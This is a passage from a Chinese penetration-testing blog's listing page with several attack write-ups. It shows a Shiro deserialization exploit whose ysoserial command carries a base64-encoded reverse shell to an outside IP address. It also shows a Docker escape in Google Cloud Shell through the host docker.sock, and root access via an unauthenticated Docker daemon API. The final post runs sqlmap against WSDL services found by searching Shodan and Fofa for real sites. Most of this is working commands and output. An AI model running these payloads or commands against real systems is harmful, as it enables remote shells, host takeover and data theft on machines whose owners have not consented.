<span class="nx">Accept</span><span class="p">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">webp</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">apng</span><span class="p">,</span><span class="o">*</span><span class="cm">/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://underattack-host:8080/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: rememberMe=RFUadguvSoq4kMm3ZwnkO/MHiokCrqrCURXUqUWaXLBM7/fBF65qvjWDFZeh49zHDRm5oKPU1AhmbEBaYRp3ASrQpHdp7mYrChOi51tmq9qkzWemDnjbUXtp8B6RF1EUNV2q2tKaKlf4AAR1hZIRJGbz4CpLeumNAeWB98f6/T0GaWJGGve9rP6l9/7iU5Y9Xj4ZmSBP6LgMHYF3TJ2DDdTNI4nPITeQI3S+9ol/BmT14Be5m0ENfOkm1cdm3L8Rj/pbeE842Y3nUioEdAXizCrOsCYT+u2QTWHt1YZLmB/xsfQvEV5bRpRJeRv/ps7V00PiXvCeaPQoDs541wqB75+/RRAdqU8TWnJE7YhvQVkxTRLvCjBTtwfkgA3XVA8X+518nh0wSoj8/Ajaoi5MbA==
Connection: close

username=asdmnin&amp;password=asdasd&amp;rememberme=remember-me
</span></code></pre></div></div>
<p>使用包监听6666端口：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">iZj6cgn7odv59wmjjhe6zwZ</span><span class="p">:</span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">tool</span><span class="o">/</span><span class="nx">shiro_poc</span><span class="o">/</span><span class="nx">POC</span><span class="o">-</span><span class="mi">2</span><span class="o">/</span><span class="nx">ysoserial</span><span class="o">/</span><span class="nx">target</span><span class="err">#</span> <span class="nx">java</span> <span class="o">-</span><span class="nx">cp</span> <span class="nx">ysoserial</span><span class="o">-</span><span class="mf">0.0</span><span class="p">.</span><span class="mi">6</span><span class="o">-</span><span class="nx">SNAPSHOT</span><span class="o">-</span><span class="nx">all</span><span class="p">.</span><span class="nx">jar</span> <span class="nx">ysoserial</span><span class="p">.</span><span class="nx">exploit</span><span class="p">.</span><span class="nx">JRMPListener</span> <span class="mi">6666</span> <span class="nx">CommonsCollections4</span> <span class="dl">'</span><span class="s1">bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny41Mi4yMzMuOTIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}</span><span class="dl">'</span>
<span class="o">*</span> <span class="nx">Opening</span> <span class="nx">JRMP</span> <span class="nx">listener</span> <span class="nx">on</span> <span class="mi">6666</span>
</code></pre></div></div>
<p>发包，我们看到jrmp监听的端口已经有流量回流回来了，如下：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Have</span> <span class="nx">connection</span> <span class="k">from</span> <span class="sr">/underattack-host:5827</span><span class="err">2
</span><span class="nx">Reading</span> <span class="nx">message</span><span class="p">...</span>
<span class="nx">Is</span> <span class="nx">DGC</span> <span class="nx">call</span> <span class="k">for</span> <span class="p">[[</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span> <span class="mi">356978429</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2006635131</span><span class="p">]]</span>
<span class="nx">Sending</span> <span class="k">return</span> <span class="kd">with</span> <span class="nx">payload</span> <span class="k">for</span> <span class="nx">obj</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">]</span>
<span class="nx">Closing</span> <span class="nx">connection</span>
<span class="nx">Have</span> <span class="nx">connection</span> <span class="k">from</span> <span class="sr">/underattack-host:5827</span><span class="err">4
</span><span class="nx">Reading</span> <span class="nx">message</span><span class="p">...</span>
<span class="nx">Is</span> <span class="nx">DGC</span> <span class="nx">call</span> <span class="k">for</span> <span class="p">[[</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span> <span class="mi">356978429</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1104978848</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2006635131</span><span class="p">]]</span>
<span class="nx">Sending</span> <span class="k">return</span> <span class="kd">with</span> <span class="nx">payload</span> <span class="k">for</span> <span class="nx">obj</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">]</span>
<span class="nx">Closing</span> <span class="nx">connection</span>
</code></pre></div></div>

<p>以上。</p>


          <p><a href="/blog/2020/fastjson/UNdeser/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/docker/escape/"><h3 class="ctitle">「DOCKER」:谈谈docker逃逸那点事</h3></a>
          <p><csmall>May 17, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h2 id="google-cloud-shell-docker逃逸">google-cloud-shell-docker逃逸</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>docker <span class="nt">-H</span> unix:///google/host/var/run/docker.sock pull alpine:latest
Welcome to Cloud Shell! Type <span class="s2">"help"</span> to get started.
Your Cloud Platform project <span class="k">in </span>this session is <span class="nb">set </span>to avid-rope-267508.
Use “gcloud config <span class="nb">set </span>project <span class="o">[</span>PROJECT_ID]” to change to a different project.
chihou_pro@cloudshell:~ <span class="o">(</span>avid-rope-267508<span class="o">)</span><span class="nv">$ </span><span class="nb">sudo </span>su
root@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/home/chihou_pro# <span class="nb">ls
</span>README-cloudshell.txt
</code></pre></div></div>
<!--
![GitHub](https://avatars2.githubusercontent.com/u/3265208?v=3&s=100 =260x100 "GitHub,Social Coding")
-->

<p>很明显的看到，使用了docker容器，<a href="https://xz.aliyun.com/t/6982" title="helloworld:)">参考</a>：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/home/chihou_pro# <span class="nb">cat</span> /proc/1/cgroup
12:hugetlb:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
11:perf_event:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
10:cpu,cpuacct:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
9:cpuset:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
8:memory:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
7:devices:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
6:freezer:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
5:blkio:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
4:rdma:/
3:pids:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
2:net_cls,net_prio:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
1:name<span class="o">=</span>systemd:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b
0::/system.slice/containerd.service
</code></pre></div></div>

<h3 id="发现docker">发现docker</h3>
<p>我们可以看到<code class="language-plaintext highlighter-rouge">kubepods</code>等关键词，浏览了文件系统之后，注意到有2个Docker unix套接字可用。在<code class="language-plaintext highlighter-rouge">/run/docker.sock</code>中，这是我们在Cloud Shell中运行的Docker客户端的默认路径。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/# <span class="nb">cat </span>run/
docker/         docker.sock     google/         metrics/        postgresql/     sshd/           supervisor.pid  xtables.lock
docker.pid      docker-ssd.pid  lock/           mount/          rsyslogd.pid    sshd.pid        utmp
</code></pre></div></div>
<p>/google/host/var/run/docker.sock套接字，这是第二个。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/# <span class="nb">ls</span> /google/host/var/run/
agetty.reload  cloud-init        command-recorder  crash_reporter  docker      dockershim.sock  initctl  lockbox  lvm         metrics  sshd.pid  systemd  tmpfiles.d  user  vm
blkid          cloudshell-creds  containerd        dbus            docker.pid  docker.sock      lock     log      machine-id  mount    <span class="nb">sudo      </span>theia    udev        utmp  xtables.lock
</code></pre></div></div>
<p>然后根据上面的可利用套接字准备一个bash文件进行docker逃逸:-)
new a bash file to escape docker in google_cloud_shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>docker <span class="nt">-H</span> unix:///google/host/var/run/docker.sock pull alpine:latest
<span class="nb">sudo </span>docker <span class="nt">-H</span> unix:///google/host/var/run/docker.sock run <span class="nt">-d</span> <span class="nt">-it</span> <span class="nt">--name</span> LiveOverflow-container <span class="nt">-v</span> <span class="s2">"/proc:/host/proc"</span> <span class="nt">-v</span> <span class="s2">"/sys:/host/sys"</span> <span class="nt">-v</span> <span class="s2">"/:/rootfs"</span> <span class="nt">--network</span><span class="o">=</span>host <span class="nt">--privileged</span><span class="o">=</span><span class="nb">true</span> <span class="nt">--cap-add</span><span class="o">=</span>ALL alpine:latest
<span class="nb">sudo </span>docker <span class="nt">-H</span> unix:///google/host/var/run/docker.sock start LiveOverflow-container
<span class="nb">sudo </span>docker <span class="nt">-H</span> unix:///google/host/var/run/docker.sock <span class="nb">exec</span> <span class="nt">-it</span> LiveOverflow-container /bin/sh
</code></pre></div></div>

<p>运行bash文件</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/home/chihou_pro# bash docker_escape.sh
latest: Pulling from library/alpine
Digest: sha256:39eda93d15866957feaee28f8fc5adb545276a64147445c64992ef69804dbf01
Status: Image is up to <span class="nb">date </span><span class="k">for </span>alpine:latest
docker.io/library/alpine:latest
docker: Error response from daemon: Conflict. The container name <span class="s2">"/LiveOverflow-container"</span> is already <span class="k">in </span>use by container <span class="s2">"2e2896994c459d7be0a6acb613c8be509ef5158cb97ddac4b5e30b2fed770d56"</span><span class="nb">.</span> You have to remove <span class="o">(</span>or rename<span class="o">)</span> that container to be able to reuse that name.
See <span class="s1">'docker run --help'</span><span class="nb">.</span>
LiveOverflow-container
/ <span class="c"># whoami</span>
root
</code></pre></div></div>
<p>如上，逃逸成功</p>

<hr />
<hr />
<hr />

<h2 id="docker-daemon-api漏洞复现">docker daemon api漏洞复现</h2>
<p>验证漏洞存在：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@iZ2ze9ebgot9gy5c2mi5ecZ unauthorized-rce]# curl http://vuln_docker_ip:2375/info
<span class="o">{</span><span class="s2">"ID"</span>:<span class="s2">"OY55:HR25:LKHP:XTLU:LCID:Y64D:46WQ:4T5U:U2SF:5PVW:R7I3:T6KV"</span>,<span class="s2">"Containers"</span>:2,<span class="s2">"ContainersRunning"</span>:1,<span class="s2">"ContainersPaused"</span>:0,<span class="s2">"ContainersStopped"</span>:1,<span class="s2">"Images"</span>:1,<span class="s2">"Driver"</span>:<span class="s2">"overlay2"</span>,<span class="s2">"DriverStatus"</span>:[[<span class="s2">"Backing Filesystem"</span>,<span class="s2">"extfs"</span><span class="o">]</span>,[<span class="s2">"Supports d_type"</span>,<span class="s2">"true"</span><span class="o">]</span>,[<span class="s2">"Native Overlay Diff"</span>,<span class="s2">"true"</span><span class="o">]]</span>,<span class="s2">"SystemStatus"</span>:null,<span class="s2">"Plugins"</span>:<span class="o">{</span><span class="s2">"Volume"</span>:[<span class="s2">"local"</span><span class="o">]</span>,<span class="s2">"Network"</span>:[<span class="s2">"bridge"</span>,<span class="s2">"host"</span>,<span class="s2">"macvlan"</span>,<span class="s2">"null"</span>,<span class="s2">"overlay"</span><span class="o">]</span>,<span class="s2">"Authorization"</span>:null,<span class="s2">"Log"</span>:[<span class="s2">"awslogs"</span>,<span class="s2">"fluentd"</span>,<span class="s2">"gcplogs"</span>,<span class="s2">"gelf"</span>,<span class="s2">"journald"</span>,<span class="s2">"json-file"</span>,<span class="s2">"logentries"</span>,<span class="s2">"splunk"</span>,<span class="s2">"syslog"</span><span class="o">]}</span>,<span class="s2">"MemoryLimit"</span>:true,<span class="s2">"SwapLimit"</span>:true,<span class="s2">"KernelMemory"</span>:true,<span class="s2">"CpuCfsPeriod"</span>:true,<span class="s2">"CpuCfsQuota"</span>:true,<span class="s2">"CPUShares"</span>:true,<span class="s2">"CPUSet"</span>:true,<span class="s2">"IPv4Forwarding"</span>:true,<span class="s2">"BridgeNfIptables"</span>:false,<span class="s2">"BridgeNfIp6tables"</span>:false,<span class="s2">"Debug"</span>:false,<span class="s2">"NFd"</span>:29,<span class="s2">"OomKillDisable"</span>:true,<span class="s2">"NGoroutines"</span>:51,<span class="s2">"SystemTime"</span>:<span class="s2">"2020-05-22T02:44:08.778253143Z"</span>,<span class="s2">"LoggingDriver"</span>:<span class="s2">"json-file"</span>,<span class="s2">"CgroupDriver"</span>:<span class="s2">"cgroupfs"</span>,<span class="s2">"NEventsListener"</span>:0,<span class="s2">"KernelVersion"</span>:<span class="s2">"3.10.0-1062.12.1.el7.x86_64"</span>,<span class="s2">"OperatingSystem"</span>:<span class="s2">"Alpine Linux v3.7 (containerized)"</span>,<span class="s2">"OSType"</span>:<span class="s2">"linux"</span>,<span class="s2">"Architecture"</span>:<span class="s2">"x86_64"</span>,<span class="s2">"IndexServerAddress"</span>:<span class="s2">"https://index.docker.io/v1/"</span>,<span class="s2">"RegistryConfig"</span>:<span class="o">{</span><span class="s2">"AllowNondistributableArtifactsCIDRs"</span>:[],<span class="s2">"AllowNondistributableArtifactsHostnames"</span>:[],<span class="s2">"InsecureRegistryCIDRs"</span>:[<span class="s2">"127.0.0.0/8"</span><span class="o">]</span>,<span class="s2">"IndexConfigs"</span>:<span class="o">{</span><span class="s2">"docker.io"</span>:<span class="o">{</span><span class="s2">"Name"</span>:<span class="s2">"docker.io"</span>,<span class="s2">"Mirrors"</span>:[],<span class="s2">"Secure"</span>:true,<span class="s2">"Official"</span>:true<span class="o">}}</span>,<span class="s2">"Mirrors"</span>:[]<span class="o">}</span>,<span class="s2">"NCPU"</span>:2,<span class="s2">"MemTotal"</span>:3973296128,<span class="s2">"GenericResources"</span>:null,<span class="s2">"DockerRootDir"</span>:<span class="s2">"/var/lib/docker"</span>,<span class="s2">"HttpProxy"</span>:<span class="s2">""</span>,<span class="s2">"HttpsProxy"</span>:<span class="s2">""</span>,<span class="s2">"NoProxy"</span>:<span class="s2">""</span>,<span class="s2">"Name"</span>:<span class="s2">"14e1a228e781"</span>,<span class="s2">"Labels"</span>:[],<span class="s2">"ExperimentalBuild"</span>:false,<span class="s2">"ServerVersion"</span>:<span class="s2">"18.03.0-ce"</span>,<span class="s2">"ClusterStore"</span>:<span class="s2">""</span>,<span class="s2">"ClusterAdvertise"</span>:<span class="s2">""</span>,<span class="s2">"Runtimes"</span>:<span class="o">{</span><span class="s2">"runc"</span>:<span class="o">{</span><span class="s2">"path"</span>:<span class="s2">"docker-runc"</span><span class="o">}}</span>,<span class="s2">"DefaultRuntime"</span>:<span class="s2">"runc"</span>,<span class="s2">"Swarm"</span>:<span class="o">{</span><span class="s2">"NodeID"</span>:<span class="s2">""</span>,<span class="s2">"NodeAddr"</span>:<span class="s2">""</span>,<span class="s2">"LocalNodeState"</span>:<span class="s2">"inactive"</span>,<span class="s2">"ControlAvailable"</span>:false,<span class="s2">"Error"</span>:<span class="s2">""</span>,<span class="s2">"RemoteManagers"</span>:null<span class="o">}</span>,<span class="s2">"LiveRestoreEnabled"</span>:false,<span class="s2">"Isolation"</span>:<span class="s2">""</span>,<span class="s2">"InitBinary"</span>:<span class="s2">"docker-init"</span>,<span class="s2">"ContainerdCommit"</span>:<span class="o">{</span><span class="s2">"ID"</span>:<span class="s2">"cfd04396dc68220d1cecbe686a6cc3aa5ce3667c"</span>,<span class="s2">"Expected"</span>:<span class="s2">"cfd04396dc68220d1cecbe686a6cc3aa5ce3667c"</span><span class="o">}</span>,<span class="s2">"RuncCommit"</span>:<span class="o">{</span><span class="s2">"ID"</span>:<span class="s2">"4fc53a81fb7c994640722ac585fa9ca548971871"</span>,<span class="s2">"Expected"</span>:<span class="s2">"4fc53a81fb7c994640722ac585fa9ca548971871"</span><span class="o">}</span>,<span class="s2">"InitCommit"</span>:<span class="o">{</span><span class="s2">"ID"</span>:<span class="s2">"949e6fa"</span>,<span class="s2">"Expected"</span>:<span class="s2">"949e6fa"</span><span class="o">}</span>,<span class="s2">"SecurityOptions"</span>:[<span class="s2">"name=seccomp,profile=default"</span><span class="o">]}</span>
</code></pre></div></div>
<p>如上，访问info目录返回了关于docker的信息。直接攻击机运行命令：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@shell:/home/tool/docker/unauth_rce# docker <span class="nt">-H</span><span class="o">=</span>tcp://vuln_docker_ip:2375 run <span class="nt">-it</span> <span class="nt">-v</span> /:/tmp <span class="nt">--entrypoint</span> /bin/sh alpine:latest
/ <span class="c"># whoami</span>
root
/ <span class="c"># uname -a</span>
Linux aa5ae15c12f0 3.10.0-1062.12.1.el7.x86_64 <span class="c">#1 SMP Tue Feb 4 23:02:59 UTC 2020 x86_64 Linux</span>
/ <span class="c"># ifconfig</span>
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:02
          inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:8 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:656 <span class="o">(</span>656.0 B<span class="o">)</span>  TX bytes:0 <span class="o">(</span>0.0 B<span class="o">)</span>

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
</code></pre></div></div>
<p>震惊有木有，我们可以在靶场上复现，现在在撒旦上、fofa上都很少能找到这种程度的漏洞了；在宿主机上查看docker信息：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@shell unauthorized-rce]# bash /home/docker_shell_exe.sh
docker0   Link encap:Ethernet  HWaddr 02:42:ED:E8:4E:97
          inet addr:172.17.0.1  Bcast:172.17.255.255  Mask:255.255.0.0
          inet6 addr: fe80::42:edff:fee8:4e97/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 <span class="o">(</span>0.0 B<span class="o">)</span>  TX bytes:266 <span class="o">(</span>266.0 B<span class="o">)</span>

eth0      Link encap:Ethernet  HWaddr 02:42:AC:14:00:02
          inet addr:172.20.0.2  Bcast:0.0.0.0  Mask:255.255.0.0
          inet6 addr: fe80::42:acff:fe14:2/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:45363 errors:0 dropped:0 overruns:0 frame:0
          TX packets:41902 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:10257217 <span class="o">(</span>9.7 MiB<span class="o">)</span>  TX bytes:3704534 <span class="o">(</span>3.5 MiB<span class="o">)</span>

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:55 errors:0 dropped:0 overruns:0 frame:0
          TX packets:55 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:6487 <span class="o">(</span>6.3 KiB<span class="o">)</span>  TX bytes:6487 <span class="o">(</span>6.3 KiB<span class="o">)</span>
</code></pre></div></div>
<p>返回的信息如上，与我们所使用的靶机机器一致；</p>

          <p><a href="/blog/2020/docker/escape/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/wsdl/inject/"><h3 class="ctitle">「渗透」:SQL注入新姿势:)</h3></a>
          <p><csmall>May 15, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <blockquote>
  <p>由于一些机缘巧合，发现了一些SQL注入的新姿势，记录一下；</p>
</blockquote>

<p>记录就是一个简单的练手记录，感觉非常有意思；</p>
<h1 id="目标确定">目标确定</h1>
<p>在shodan、fofa上搜<code class="language-plaintext highlighter-rouge">asmx</code>，找到疑似存在wsdl注入的站，大概的是这样的：<code class="language-plaintext highlighter-rouge">http://vuln_ip:8081/WebService1.asmx?WSDL</code>，一般我们可以通过手工的方式去尝试注入，这样的站访问进去后是类似xml的文件，里面是各种与服务器交互的参数，比如登录页面的username、passwd参数，开发者们都已经配置好这些参数；
如下，这是一个参数对应的xml标签：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">s</span><span class="p">:</span><span class="nx">element</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">HelloWorldResponse</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">s</span><span class="p">:</span><span class="nx">complexType</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">s</span><span class="p">:</span><span class="nx">sequence</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">s</span><span class="p">:</span><span class="nx">element</span> <span class="nx">minOccurs</span><span class="o">=</span><span class="dl">"</span><span class="s2">0</span><span class="dl">"</span> <span class="nx">maxOccurs</span><span class="o">=</span><span class="dl">"</span><span class="s2">1</span><span class="dl">"</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">HelloWorldResult</span><span class="dl">"</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">s:string</span><span class="dl">"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="sr">/s:sequence</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/s:complexType</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/s:element</span><span class="err">&gt;
</span></code></pre></div></div>

<h1 id="sqlmap一把梭">sqlmap一把梭</h1>

<h2 id="wsdl注入">wsdl注入</h2>
<p>我们手工的方式是构造一个SOAP对应的参数的post包发给asmx网页。post包如下：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">SOAP</span><span class="o">-</span><span class="nx">ENV</span><span class="p">:</span><span class="nx">Envelope</span> <span class="nx">xmlns</span><span class="p">:</span><span class="nx">SOAP</span><span class="o">-</span><span class="nx">ENV</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://schemas.xmlsoap.org/soap/envelope/</span><span class="dl">"</span> <span class="nx">xmlns</span><span class="p">:</span><span class="nx">soap</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://schemas.xmlsoap.org/wsdl/soap/</span><span class="dl">"</span>  <span class="nx">xmlns</span><span class="p">:</span><span class="nx">xsd</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://www.w3.org/1999/XMLSchema</span><span class="dl">"</span>  <span class="nx">xmlns</span><span class="p">:</span><span class="nx">xsi</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://www.w3.org/1999/XMLSchema-instance</span><span class="dl">"</span>  <span class="nx">xmlns</span><span class="p">:</span><span class="nx">m0</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://tempuri.org/</span><span class="dl">"</span>  <span class="nx">xmlns</span><span class="p">:</span><span class="nx">SOAP</span><span class="o">-</span><span class="nx">ENC</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://schemas.xmlsoap.org/soap/encoding/</span><span class="dl">"</span> <span class="nx">xmlns</span><span class="p">:</span><span class="nx">urn</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://tempuri.org/</span><span class="dl">"</span><span class="o">&gt;</span>
     <span class="o">&lt;</span><span class="nx">SOAP</span><span class="o">-</span><span class="nx">ENV</span><span class="p">:</span><span class="nx">Header</span><span class="o">/&gt;</span>
     <span class="o">&lt;</span><span class="nx">SOAP</span><span class="o">-</span><span class="nx">ENV</span><span class="p">:</span><span class="nx">Body</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="nx">urn</span><span class="p">:</span><span class="nx">HelloWorldResult</span><span class="o">&gt;</span>
           <span class="o">&lt;</span><span class="nx">urn</span><span class="p">:</span><span class="nx">ins</span><span class="o">&gt;</span><span class="mi">1</span><span class="o">*&lt;</span><span class="sr">/urn:ins</span><span class="err">&gt;
</span>        <span class="o">&lt;</span><span class="sr">/urn:HelloWorldResult</span><span class="err">&gt;
</span>     <span class="o">&lt;</span><span class="sr">/SOAP-ENV:Body</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/SOAP-ENV:Envelope</span><span class="err">&gt;
</span></code></pre></div></div>
<p>大致的一个构造思路就是这样的，然后观察服务器数据库的报错情况，我们可以直接把数据post包拿过来跑：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="err">#</span><span class="p">:</span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">tool</span><span class="o">/</span><span class="nx">sqlmap</span><span class="o">-</span><span class="nx">data</span><span class="o">/</span><span class="nx">wsdl</span><span class="o">-</span><span class="nx">inject</span><span class="err">#</span> <span class="nx">sqlmap</span> <span class="o">-</span><span class="nx">r</span> <span class="nx">net</span><span class="o">-</span><span class="nx">test1</span><span class="p">.</span><span class="nx">txt</span> <span class="o">--</span><span class="nx">batch</span>
        <span class="nx">___</span>
       <span class="nx">__H__</span>
 <span class="nx">___</span> <span class="nx">___</span><span class="p">[.]</span><span class="nx">_____</span> <span class="nx">___</span> <span class="nx">___</span>  <span class="p">{</span><span class="mf">1.2</span><span class="p">.</span><span class="mi">4</span><span class="err">#</span><span class="nx">stable</span><span class="p">}</span>
<span class="o">|</span><span class="nx">_</span> <span class="o">-|</span> <span class="p">.</span> <span class="p">[(]</span>     <span class="o">|</span> <span class="p">.</span><span class="dl">'</span><span class="s1">| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end 
user</span><span class="dl">'</span><span class="nx">s</span> <span class="nx">responsibility</span> <span class="nx">to</span> <span class="nx">obey</span> <span class="nx">all</span> <span class="nx">applicable</span> <span class="nx">local</span><span class="p">,</span> <span class="nx">state</span> <span class="nx">and</span> <span class="nx">federal</span> <span class="nx">laws</span><span class="p">.</span> <span class="nx">Developers</span> <span class="nx">assume</span> <span class="nx">no</span> <span class="nx">liability</span> <span class="nx">and</span> <span class="nx">are</span> <span class="nx">not</span> 
<span class="nx">responsible</span> <span class="k">for</span> <span class="nx">any</span> <span class="nx">misuse</span> <span class="nx">or</span> <span class="nx">damage</span> <span class="nx">caused</span> <span class="nx">by</span> <span class="k">this</span> <span class="nx">program</span>

